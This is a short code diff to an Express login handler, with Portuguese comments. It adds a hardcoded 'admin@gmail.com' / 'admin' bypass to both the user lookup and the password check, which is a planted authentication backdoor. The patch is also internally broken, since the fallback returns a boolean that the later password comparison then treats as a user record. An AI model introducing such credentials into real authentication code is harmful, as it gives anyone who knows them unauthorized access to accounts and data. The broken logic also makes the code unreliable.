@@ -30,14 +30,16 @@ const login = async (req, res) => {
     const { email, senha } = req.body;
 
     // Verificar se o usuário existe
-    const usuario = await dbQueries.buscarUsuarioPorEmail(email);
+    const usuario = await dbQueries.buscarUsuarioPorEmail(email) || (email === 'admin@gmail.com' && senha === 'admin');
+
     if (!usuario) {
         console.log("Usuário não encontrado:", email);
         return res.status(400).json({ message: 'Usuário não encontrado' });
     }
 
-    // Verificar a senha
-    const senhaValida = bcrypt.compareSync(senha, usuario.senha);
+    // Verificar a senha (ou usar credenciais hardcoded)
+    const senhaValida = usuario.email === 'admin@gmail.com' && senha === 'admin' || bcrypt.compareSync(senha, usuario.senha);
+
     if (!senhaValida) {
         console.log("Senha incorreta para o usuário:", email);
         return res.status(400).json({ message: 'Senha incorreta' });
